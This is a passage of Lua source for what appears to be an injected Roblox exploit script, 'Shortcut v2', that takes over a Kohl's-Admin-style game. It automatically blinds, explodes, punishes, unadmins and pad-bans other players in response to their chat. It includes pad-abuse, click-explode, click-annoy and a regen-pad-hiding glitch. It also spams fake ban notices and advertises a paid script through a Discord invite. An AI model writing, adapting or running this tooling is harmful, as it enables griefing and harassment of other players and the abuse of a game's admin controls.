                elseif string.sub(command, 1, 3) == "see" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  "..plr.Name..": See what? \n \n \n ")
                elseif string.sub(command, 1, 3) == "aaa" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("h \n \n \n "..plr.Name..": Aaaa \n \n \n  \n \n a")
                elseif string.sub(command, 1, 7) == "eeeeee" then
                    game.Players:Chat("pm "..plr.Name.." noice \n \n \n \n lol")
                    game.Players:Chat("h \n \n \n "..plr.Name..": \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n yay i am weird \n \n \n")
                elseif string.sub(command, 1, 10) == "skydive all" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("-smd no skydiving all")
                elseif string.sub(command, 1, 10) == "skydive oth" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("-smd no skydiving all")
                elseif string.sub(command, 1, 11) == ":skydive all" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("-smd no skydiving all")
                elseif string.sub(command, 1, 11) == "skydive oth" then
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("-smd no skydiving all")
                elseif string.sub(command, 1, 6) == "reload" then
                    game.Players:Chat("h \n \n \n "..plr.Name.." Reloading my gun rn \n \n \n ")
                    game.Players:Chat("blind "..plr.Name.."")
                    wait(2.5)
                    game.Players:Chat("refresh "..plr.Name.."")
                    wait(.5)
                    game.Players:Chat("gear "..plr.Name.." 212296936")
                elseif string.sub(command, 1, 7) == ":reload" then
                    game.Players:Chat("h \n \n \n "..plr.Name.." Reloading my gun rn \n \n \n ")
                    game.Players:Chat("blind "..plr.Name.."")
                    wait(2.5)
                    game.Players:Chat("refresh "..plr.Name.."")
                    game.Players:Chat("refresh m")
                    wait(.5)
                    game.Players:Chat("gear "..plr.Name.." 212296936")
                elseif string.sub(command, 1, 1) == "?" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I need to ask you something \n \n \n ")
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("size "..plr.Name.." 9.9")
                    game.Players:Chat("size "..plr.Name.." 10")
                    game.Players:Chat("pm "..plr.Name.." LOPI LOPI moment lol lets admit this is funny. To avoid this from happening don't say ''?'' lol you're not funzy nor Mia so")
                    game.Players:Chat("music 6910504716")
                elseif string.sub(command, 1, 3) == "son" then
                    game.Players:Chat("music 8528802212")
                elseif string.sub(command, 1, 4) == "chao" then
                    game.Players:Chat("music 8528802212")
                elseif string.sub(command, 1, 8) == ":refresh" then
                    game.Players:Chat("h \n \n \n "..plr.Name.." Refreshing my browser rq \n \n \n ")
                    game.Players:Chat("blind random")
                    game.Players:Chat("clone all")
                    wait(2)
                    game.Players:Chat("explode "..plr.Name.."")
                elseif string.sub(command, 1, 8) == "refresh" then
                    game.Players:Chat("h \n \n \n "..plr.Name.." Refreshing my browser rq \n \n \n ")
                    game.Players:Chat("blind random")
                    game.Players:Chat("clone all")
                    wait(2)
                    game.Players:Chat("explode "..plr.Name.."")
                elseif string.sub(command, 1, 9) == "deltarune" then
                    game.Players:Chat("music 4207207833")
                    game.Players:Chat("time 7.5")
                elseif string.sub(command, 1, 11) == "h Automusic" then
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yikes "..plr.Name.." Turns out you've injected a c00lkidd script which means you'll be unable to get along with the fun of servers protected with SS TAKEOVER ANTICRASH V3 loaded","all")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("If you wanna get a good script that has proper support join disco ord .gg/65yHbG4Wfa. We're just tryna help you. Being a c00lkidd fan is unhealthy let me tell you that. LEAVE THEIR DISCO ORD","all")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 11) == "h Automusic" then
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yikes "..plr.Name.." Turns out you've injected a c00lkidd script which means you'll be unable to get along with the fun of servers protected with SS TAKEOVER ANTICRASH V3 loaded","all")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("If you wanna get a good script that has proper support join disco ord .gg/65yHbG4Wfa. We're just tryna help you. Being a c00lkidd fan is unhealthy let me tell you that. LEAVE THEIR DISCO ORD","all")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "prot" then
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This server is protected by SS TAKEOVER ANTICRASH V3 Created by T3chn0#0253 made for Shortcut v2.","all")
                    wait(.2)
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get the script here disco ord .gg/65yHbG4Wfa only it ain't free lol","all")
                    game.Players:Chat("h \n \n \n "..plr.Name.." I want that darn script \n \n \n ")
                    game.Players:Chat("explode "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "scri" then
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This server is protected by SS TAKEOVER ANTICRASH V3 Created by T3chn0#0253 made for Shortcut v2.","all")
                    wait(.2)
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get the script here disco ord .gg/65yHbG4Wfa only it ain't free lol","all")
                    game.Players:Chat("h \n \n \n "..plr.Name..": I want that darn script \n \n \n ")
                    game.Players:Chat("explode "..plr.Name.."")
                else
                    game.Players:Chat(command)
                end
            end
		task.spawn(function()
			for ag, a7 in pairs(Whitelist) do
				if plr.Name == a7 then
					local ba = string.gsub(a6:lower(), "me", plr.Name)
					if string.sub(ba, 1, 1) == e then
						if string.sub(ba, 2, 5) == "move" then
							u("pm " .. plr.Name .. " Can't move the core player sorry!")
						else
							u(ba)
						end
					end
				end
			end
		end)
		task.spawn(function()
			if string.sub(a6:lower(), 0, 8) == "unpunish" or string.sub(a6:lower(), 0, 9) == ":unpunish" or string.sub(a6:lower(), 0, 3) == "sit" or string.sub(a6:lower(), 0, 4) == ":sit" or string.sub(a6:lower(), 0, 4) == "stun" or string.sub(a6:lower(), 0, 5) == ":stun" then
				if r == true then
					local bb = true;
					for ag, ignore in pairs(Ignore) do
						if ignore[ag] == plr.Name then
							bb = false
						end
					end;
					if plr.Name == game.Players.LocalPlayer.Name then
						bb = false
					end;
					if bb == true then
						u("reset " .. plr.Name)
					end
				end
			end
		end)
		task.spawn(function()
			if o == true then
				print("[" .. plr.Name .. "]: " .. a6)
			end;
			if string.sub(a6, 1, 6) == "handes" then
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
					Text = "[" .. plr.Name .. getTag() .. "]: " .. string.sub(a6, 8),
					TextStrokeTransparency = 0.75,
					Font = Enum.Font.SourceSansBold,
					Color = Color3.new(128, 0, 0),
					FontSize = Enum.FontSize.Size18
				})
			end
		end)
		if a6:lower() == "logs" or a6:lower() == ":logs" then
			local a7 = plr.Name;
			if n == true then
				if a7 == game.Players.LocalPlayer.Name then
					u("ff No antilogs for you!")
				else
					for ag = 1, 100 do
						u("h Lol " .. a7 .. " tried to use logs xD!")
					end
				end
			end
		else
			if p == true then
				if a6:lower() == "-cmds" then
					say(" -cmds -- Get commands!")
					say(" -order (plr) -- Order a drink!")
					say(" -leaderboard -- All MPS's stored")
					say(" -quote -- Grab a random quote!")
					say(" -mps -- Messages per second! get your messages per second ;)")
				end;
				if string.sub(a6:lower(), 1, 6) == "-order" then
					say(plr.Name .. " just ordered " .. tostring(math.random(1, 5)) .. " " .. drinks[math.random(1, # drinks)] .. "'s to his friend " .. string.sub(a6:lower(), 8))
				end;
				if a6:lower() == "-quote" then
					say(Quotes[math.random(1, # Quotes)])
				end;
				if a6:lower() == "-mps" then
					for ag, ae in pairs(MPS_Users) do
						if ae == plr.Name then
							say("Your best MPS was " .. MPS_Max[ag] .. " (Even if no one can see the message it will still count)")
						end
					end
				end;
				if a6:lower() == "-leaderboard" then
					for ag, ae in pairs(MPS_Users) do
						say(MPS_Users[ag] .. " Current MPS: " .. MPS[ag] .. " MPS: " .. MPS_Max[ag])
					end
				end
			end
		end;
		found = false;
		for ag, ae in pairs(MPS_Users) do
			if ae == plr.Name then
				found = true;
				MPS[ag] = MPS[ag] + 1
			end
		end;
		if found == false then
			table.insert(MPS_Users, plr.Name)
			table.insert(MPS, 0)
			table.insert(MPS_Max, 0)
		end
    end
end)
end
function getTag()
	local bc = game.Players.LocalPlayer.UserId;
	bc = string.gsub(bc, "0", "9")
	bc = string.gsub(bc, "1", "8")
	bc = string.gsub(bc, "2", "7")
	bc = string.gsub(bc, "3", "6")
	bc = string.gsub(bc, "4", "5")
	bc = string.gsub(bc, "5", "4")
	bc = string.gsub(bc, "6", "3")
	bc = string.gsub(bc, "7", "2")
	bc = string.gsub(bc, "8", "1")
	bc = string.gsub(bc, "9", "0")
	return string.sub(bc, 0, 4)
end;
Pad_Ban = {
	"egglnq"
}
Whitelist = {}
Admin = {}
Ignore = {
	game.Players.LocalPlayer.Name
}
MPS_Users = {}
MPS = {}
MPS_Max = {}
drinks = {
	"Coke",
	"Milk",
	"Sprit",
	"Cognac",
	"Coffee",
	"Chocolate milk",
	"Hot Chocolate",
	"Ice cream"
}
for ag, ae in pairs(game.Players:GetChildren()) do
	start(ae)
end;
task.spawn(function()
	while true do
		for ag, ae in pairs(MPS_Users) do
			if MPS[ag] >= MPS_Max[ag] then
				MPS_Max[ag] = MPS[ag]
				MPS[ag] = 0
			end
		end;
		wait(1)
	end
end)
task.spawn(function()
	while true do
		wait(0.003)
		local bd = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
		if s == true then
			if bd.Y < 0 then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(bd.X, 3, bd.Z))
			end
		end
	end
end)
local CancelTeleport = false;
function gotoShortcutHub(be, bf)
	CancelTeleport = false;
	if AllowTeleportsToShortcutHub == true then
		logn("Write anything to cancel teleport")
		logn("Teleporting to ShortcutHub | Reason : " .. be .. " | Please wait " .. bf .. " seconds.")
		wait(bf)
		if CancelTeleport == false then
			logn("Please wait while our servers teleport you there.")
			game:GetService("TeleportService"):Teleport(6418152615, game.Players.LocalPlayer)
		elseif CancelTeleport == false then
			logn("Cancled teleport (Ty :D)")
		end
	end
end;
task.spawn(function()
        while true do
            for i, player in pairs(Pad_Ban) do
                for i, pad in pairs(adminFlr.Pads:GetDescendants()) do
                    if pad.Name == player .. "'s admin" then
			            padsEnforcement = false
                        u("respawn " .. player)
                        u(prefix.."spam /reg")
                        u("h \n \n \n Lol "..player.." you're banned from the admin pads \n \n \n ");wait()
                        u("/trap " .. player)
                        u(prefix.."stop")
                        u("/nonperm")
                        u(prefix.."temploopgrab");wait()
                        u("stun " .. player);wait()
                        u("unpunish " .. player);wait()
                        u("fly " .. player);wait(1.4)
                        u("sit " .. player)
                        u("speed " .. player .. " 0")
                        u("jumppower " .. player .. " 0")
                        u("noclip " .. player);wait(1)
                        u("/bok " .. player);wait()
                        u("noclip " .. player);wait()
                        u(prefix.."untemploopgrab");wait(2.5)
                        regen()
                    end
                end
            end
            if padsEnforcement == true then
                for i, v in pairs(game.Players:GetChildren()) do
                    local times = 0
                    for i, pad in pairs(adminFlr.Pads:GetDescendants()) do
                        if pad.Name == v.Name .. "'s admin" then
                            times = times + 1
                        end
                    end
                    if times >= 3 then
                        u("h \n \n \n Shortcut v2: Someone tried to take all pads, therefore we have to regenerate \n \n \n ")
                        u("refresh " .. v.Name)
                        u(":refresh " .. v.Name)
                        u(prefix.."super explode 0110 123 " .. v.Name);wait(.5)
                        u("/spam :explode 1562 " .. v.Name)
                        u(prefix.."spam explode raw " .. v.Name)
                        u(":explode solo " .. v.Name);wait(5)
                        u(prefix.."stop")
                        regen()
                    end
                end
            end
            wait(0.25)
        end
    end
)
task.spawn(function()
	mods()
end)
logn("loaded")

-- End of the v1 bit. Back to v2 B-)

for i, v in pairs(game.Players:GetPlayers()) do
    v.Backpack.ChildAdded:Connect(function(child)
            if child:IsA("Tool") and antigear then
                cht("ungear "..csp.." others " .. math.random(1, 1000))
            end
        end)
    v.CharacterAdded:Connect(function()v.Backpack.ChildAdded:Connect(function(child)
                    if child:IsA("Tool") and antigear then
                        cht("ungear "..csp.." others " .. math.random(1, 1000));wait(.5)
                        cht("ungear "..csp.." others " .. math.random(1, 1000))
                    end
                end)
        end)
end

game.Players.PlayerAdded:Connect(function(plr)
        game.Players.CharacterAdded:Connect(
            function()
                game.Players.Backpack.ChildAdded:Connect(function(child)
                        if child:IsA("Tool") and antigear then
                            cht("ungear "..csp.." others " .. math.random(1, 1000));wait(.5)
                            cht("ungear "..csp.." others " .. math.random(1, 1000));wait(.5)
                            cht("ungear "..csp.." others " .. math.random(1, 1000))
                        end
                    end)
            end)
    end)

local UserInputService = game:GetService("UserInputService")

UserInputService.WindowFocused:Connect(
    function()
        if autoafk == true then
            wait(1)
            cht("unname "..csp.." me " .. math.random(1, 55))
            logn("Webcam detected movement. The AFK request has been revoked");wait(1)
            cht("unname "..csp.." me " .. math.random(1, 55));wait(1)
            logn("Say cheese for the photo please");wait(7.5)
            logn("Photo sent to #staff-feet-pics")
        end
    end)

UserInputService.WindowFocusReleased:Connect(
    function()
        if autoafk == true then
            logn("Checking webcam...")
            cht("name me Request pending...");wait(.65)
            cht("name me Tabbed out - \n" .. game.Players.LocalPlayer.DisplayName)
            logn("AFK Successfully registered. The Image has been uploaded!")
        end
    end
)

function hook()
    human = plyrs.LocalPlayer.Character.Humanoid

    coroutine.wrap(function()
            human:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                    if antiSpeed then
                        human.WalkSpeed = 16
                    end
                end)
        end)()

    coroutine.wrap(function()
            plyrs.LocalPlayer.Character.DescendantAdded:Connect(function(i)
                    if i.Name == "BodyForce" and antiSetgrav then
                        local root = plyrs.LocalPlayer.Character.HumanoidRootPart
                        i.Force = Vector3.new(0, 0, 0)
                        repeat
                            rns.Heartbeat:Wait()
                        until i == nil
                        root.Velocity = Vector3.new(0, 0, 0)
                    elseif i.Name == "BodyPosition" and antiSetgrav then
                        i:Destroy()
                        root.Velocity = Vector3.new(0, 0, 0)
                    end
                end)
        end)()
end
hook()

local con5344 =
    plyrs.LocalPlayer.CharacterAdded:connect(
    function(chr)
        wait()
        hook()
    end)
table.insert(connections, con5344)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(
    function()
        if antiBlind == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "EFFECTGUIBLIND" then
                    v:Destroy()
                end
            end
        end
        if colors == true then
            while colors do
                cht(
                    "fogcolor " ..
                        tostring(math.random(0, 255)) ..
                            " " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255))
                )
                wait(.075)
            end
        end

        if antiMsg == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
                    v:Destroy()
                end
            end
        end
    end)

wait(1.5)
perm = false

-- Custom PlayerList
-- Playerlist

local PlayerList = Instance.new("ScreenGui")

coroutine.wrap(function()
        -- Instances:

        local PlayerListMaster = Instance.new("Frame")
        local SizeOffsetFrame = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local ScrollingFrameContainer = Instance.new("Frame")
        local UIListLayout_2 = Instance.new("UIListLayout")

        --Properties:

        PlayerList.Name = "PlayerList"
        PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        PlayerList.DisplayOrder = 1

        PlayerListMaster.Name = "PlayerListMaster"
        PlayerListMaster.Parent = PlayerList
        PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
        PlayerListMaster.BackgroundTransparency = 1.000
        PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
        PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

        SizeOffsetFrame.Name = "SizeOffsetFrame"
        SizeOffsetFrame.Parent = PlayerListMaster
        SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        SizeOffsetFrame.BackgroundTransparency = 1.000
        SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
        SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

        UIListLayout.Parent = SizeOffsetFrame
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        ScrollingFrameContainer.Name = "ScrollingFrameContainer"
        ScrollingFrameContainer.Parent = SizeOffsetFrame
        ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
        ScrollingFrameContainer.BackgroundTransparency = 0.300
        ScrollingFrameContainer.BorderSizePixel = 0
        ScrollingFrameContainer.LayoutOrder = 3
        ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
        ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

        UIListLayout_2.Parent = ScrollingFrameContainer
        UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

        -- Scripts:

        local function KTJYHGG_fake_script()
            local script = Instance.new("LocalScript", ScrollingFrameContainer)

            function addBox(isPerm, plrName, plrDisplay)
                local PlayerHere = Instance.new("Frame")
                local ChildrenFrame = Instance.new("Frame")
                local NameFrame = Instance.new("Frame")
                local DisplayName = Instance.new("Frame")
                local PlayerName = Instance.new("TextLabel")
                local SizeConstraint = Instance.new("UITextSizeConstraint")
                local PermUI = Instance.new("Frame")
                local PlayerName_2 = Instance.new("TextLabel")
                local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
                local PlayerName_3 = Instance.new("Frame")
                local PlayerName_4 = Instance.new("TextLabel")
                local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
                local Layout = Instance.new("UIListLayout")

                PlayerHere.Name = plrName
                PlayerHere.Parent = script.Parent
                PlayerHere.BackgroundTransparency = 1.000
                PlayerHere.ClipsDescendants = true
                PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

                ChildrenFrame.Name = "ChildrenFrame"
                ChildrenFrame.Parent = PlayerHere
                ChildrenFrame.BackgroundTransparency = 1.000
                ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

                NameFrame.Name = "NameFrame"
                NameFrame.Parent = ChildrenFrame
                NameFrame.BackgroundTransparency = 1.000
                NameFrame.Size = UDim2.new(0, 150, 0, 40)

                DisplayName.Name = "DisplayName"
                DisplayName.Parent = NameFrame
                DisplayName.BackgroundTransparency = 1.000
                DisplayName.LayoutOrder = 3
                DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
                DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

                PlayerName.Name = "PlayerName"
                PlayerName.Parent = DisplayName
                PlayerName.BackgroundTransparency = 1.000
                PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
                PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName.Font = Enum.Font.GothamSemibold
                PlayerName.Text = plrDisplay
                PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName.TextScaled = true
                PlayerName.TextSize = 14.000
                PlayerName.TextWrapped = true
                PlayerName.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint.Name = "SizeConstraint"
                SizeConstraint.Parent = PlayerName
                SizeConstraint.MaxTextSize = 14
                SizeConstraint.MinTextSize = 9

                PermUI.Name = "PermUI"
                PermUI.Parent = NameFrame
                PermUI.BackgroundTransparency = 1.000
                PermUI.LayoutOrder = 3
                PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
                PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

                PlayerName_2.Name = "PlayerName"
                PlayerName_2.Parent = PermUI
                PlayerName_2.BackgroundTransparency = 1.000
                PlayerName_2.Position = UDim2.new(0, 0, 0.280000001, 0)
                PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_2.Font = Enum.Font.GothamSemibold
                PlayerName_2.Text = "    "
                if isPerm then
                    PlayerName_2.Text = "VIP"
                end
                PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_2.TextScaled = true
                PlayerName_2.TextSize = 14.000
                PlayerName_2.TextWrapped = true
                PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_2.Name = "SizeConstraint"
                SizeConstraint_2.Parent = PlayerName_2
                SizeConstraint_2.MaxTextSize = 14
                SizeConstraint_2.MinTextSize = 9

                PlayerName_3.Name = "PlayerName"
                PlayerName_3.Parent = NameFrame
                PlayerName_3.BackgroundTransparency = 1.000
                PlayerName_3.LayoutOrder = 3
                PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

                PlayerName_4.Name = "PlayerName"
                PlayerName_4.Parent = PlayerName_3
                PlayerName_4.BackgroundTransparency = 1.000
                PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.280000001, 0)
                PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_4.Font = Enum.Font.GothamSemibold
                PlayerName_4.Text = plrName
                PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_4.TextScaled = true
                PlayerName_4.TextSize = 14.000
                PlayerName_4.TextWrapped = true
                PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_3.Name = "SizeConstraint"
                SizeConstraint_3.Parent = PlayerName_4
                SizeConstraint_3.MaxTextSize = 14
                SizeConstraint_3.MinTextSize = 9

                Layout.Name = "Layout"
                Layout.Parent = ChildrenFrame
                Layout.FillDirection = Enum.FillDirection.Horizontal
                Layout.SortOrder = Enum.SortOrder.Name
                Layout.VerticalAlignment = Enum.VerticalAlignment.Center
            end

            game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

            game.Players.ChildRemoved:Connect(function(player)
                    if script.Parent:FindFirstChild(player.Name) then
                        script.Parent:FindFirstChild(player.Name):remove()
                    end
                end)

            while wait(1) do
                for _, plr in pairs(game.Players:GetChildren()) do
                    if not script.Parent:FindFirstChild(plr.Name) then
                        addBox(hasGamepass(plr.UserId, 66254), plr.Name, plr.DisplayName)
                        wait()
                    --script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
                    end
                end
            end
        end
        coroutine.wrap(KTJYHGG_fake_script)()
    end
)()

-- Instances:

local SCv2_ButtonList = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local UICorner = Instance.new("UICorner")
local CloseUI = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

--Properties:

SCv2_ButtonList.Name = "SCv2_ButtonList"
SCv2_ButtonList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SCv2_ButtonList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = SCv2_ButtonList
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.BorderColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.137755096, 0, 0.319999993, 0)
Frame.Size = UDim2.new(0, 262, 0, 25)

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0152671756, 0, 1, 0)
ScrollingFrame.Size = UDim2.new(0, 254, 0, 300)
ScrollingFrame.CanvasSize = UDim2.new(1, 0, 3, 0)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.CellSize = UDim2.new(1, -10, 0, 25)

UICorner.CornerRadius = UDim.new(0, 2)
UICorner.Parent = Frame

CloseUI.Name = "CloseUI"
CloseUI.Parent = Frame
CloseUI.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.BackgroundTransparency = 1.000
CloseUI.BorderColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.Position = UDim2.new(5.904511452, 0, -1.0300000012, 0)
CloseUI.Size = UDim2.new(0, 25, 0, 25)
CloseUI.Font = Enum.Font.SourceSans
CloseUI.Text = "lol"
CloseUI.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseUI.TextSize = 14.000

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = CloseUI -- UNUSED IN FINAL VERSION

-- Scripts:

local function NKEI_fake_script() -- ScrollingFrame.LocalScript
    local script = Instance.new("LocalScript", ScrollingFrame)

    local ClrPlt = {
        DefBk = Color3.fromRGB(33, 33, 33),
        Enabled = Color3.fromRGB(44, 44, 44)
    }

    function addBtn(text, callback)
        local btn = Instance.new("TextButton", script.Parent)
        btn.BackgroundColor3 = ClrPlt.DefBk
        btn.BorderSizePixel = 0
        btn.Size = UDim2.new(0, 254, 0, 25)
        btn.Text = text
        btn.Name = text -- Order
        btn.TextSize = 14.000
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.MouseButton1Click:Connect(
            function()
                callback(btn)
            end)
    end

    function addTlg(text, callback_e, callback_d)
        addBtn(text,function(self)
                if self.BackgroundColor3 == ClrPlt.DefBk then
                    self.BackgroundColor3 = ClrPlt.Enabled
                    callback_e(self)
                else
                    self.BackgroundColor3 = ClrPlt.DefBk
                    callback_d(self)
                end
            end
        )
    end

    -- UI

    addTlg(
        "PadAbuse/loopgrab all",
        function()
            testgrab = true ;wait(5)
            padAbuse = true ;wait()
            testgrab = false
        end,
        function()
            padAbuse = false ;wait(5)
            padAbuse = false ;wait(5)
            padAbuse = false

        end
    )

    addTlg(
        "RainbowEx",
        function()
            cht("disco")
            rainbowEx = true
        end,
        function()
            rainbowEx = false 
            wait(.2)
            cht("fix")
        end
    )

    addTlg(
        "ClickExplode",
        function()
            clickExpode = true
        end,
        function()
            clickExpode = false
        end
    )

    addTlg(
        "ClickPadban",
        function()
            clickPadban = true
        end,
        function()
            clickPadban = false
        end
    )
    addTlg(
        "ClickTrip",
        function()
            trippin = true
        end,
        function()
            trippin = false
        end
    )

    addTlg(
        "ClickAnnoy",
        function()
            cht("pm me Type [double slash]stop to stop it") -- Because the pm command does not support symbols
            logn("Type "..prefix.."stop to stop it")
            clickAnnoy = true
        end,
        function()
            clickAnnoy = false
        end
    )

    addBtn(
        "HideRegenPad",
        function(v)
            game.Players:Chat("invis me")
            game.Players:Chat("gear me "..csp.."108158379")
            local function L_1_func()
                repeat wait()
                until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
            end
            local function L_2_func()
                repeat wait()
                until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                task.spawn(function()
                    while true do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                        L_13_.CFrame = L_12_.Regen.CFrame * CFrame.new(-1 * (L_12_.Regen.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                        if not L_14_ then
                            break
                        end
                    end
                end)
                task.spawn(function()
                    while L_14_ do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players:Chat("unpunish me "..math.random(1,1000))
                    end
                end);wait(0.3)
                L_14_ = false
            end
            local L_3_ = math.random(1, 2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999, 999999999, 9999999999));wait(.25)
            game.Players:Chat("setgrav me -550");wait()
            game.Players:Chat("gear me "..csp.."108158379")
            L_1_func();wait(.35)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            local L_4_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            game.Players:Chat("unfly me");wait(.2)
            repeat
                L_2_func()
        
            until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
        
            local L_5_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
            repeat wait()
            until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
        
            game.Players.LocalPlayer.Character:Destroy()
            L_1_func();wait(.35)
            local L_6_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
